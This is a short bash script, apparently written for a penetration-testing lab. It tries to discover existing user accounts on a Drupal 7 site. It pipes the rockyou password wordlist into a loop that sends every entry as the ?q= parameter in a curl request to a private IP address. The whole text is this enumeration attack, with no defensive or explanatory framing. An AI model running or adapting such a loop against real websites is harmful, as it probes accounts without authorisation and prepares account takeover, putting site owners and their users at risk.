#!/bin/bash
#find an existing user in Drupal 7

cat /usr/share/wordlists/rockyou.txt | while read line
do
	curl http://192.168.230.147/?q=$line
done
